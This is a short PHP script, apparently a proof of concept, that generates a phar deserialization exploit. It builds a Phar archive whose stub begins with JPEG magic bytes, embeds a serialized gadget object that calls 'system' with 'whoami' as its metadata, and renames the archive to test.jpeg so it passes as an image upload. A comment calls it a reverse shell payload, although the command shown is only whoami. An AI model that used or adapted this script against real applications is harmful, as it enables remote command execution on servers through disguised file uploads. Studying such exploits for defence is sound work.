<?php
include 'random_class.php';

@unlink('test.jpeg');
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>"); 

// add object of any class as meta data
$payload = new AnyClass('system', "whoami");

// Rerverse shell payload

$phar->setMetadata($payload);
$phar->stopBuffering();

rename("test.phar","test.jpeg");